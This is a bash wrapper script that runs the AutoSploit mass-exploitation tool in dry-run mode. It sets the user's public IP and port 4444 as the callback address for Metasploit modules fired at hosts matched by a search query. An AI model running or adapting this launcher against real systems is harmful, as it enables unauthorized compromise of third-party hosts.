#!/usr/bin/env bash


if [[ $# -lt 1 ]]; then
    echo "Syntax:"
    echo -e "\t./dryrun_autosploit.sh <search_query> [whitelist]"
	exit 1
fi

echo -e "[!] Make sure you are not on your localhost while running this script, press enter to continue";
read

WHITELIST=$2
SEARCH_QUERY=$1
LPORT=4444

LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
TIMESTAMP=`date +%s`


if [ ! $WHITELIST ]; then
  echo "executing: python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e"

  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e
else
  echo "executing: python autosploit.py -s -c -q \"${SEARCH_QUERY}\" --overwrite --whitelist $WHITELIST -e -C \"msf_autorun_${TIMESTAMP}\" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e"

  python autosploit.py -s -c -q "${SEARCH_QUERY}" --overwrite --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT --exploit-file-to-use etc/json/default_modules.json --dry-run -e
fi;
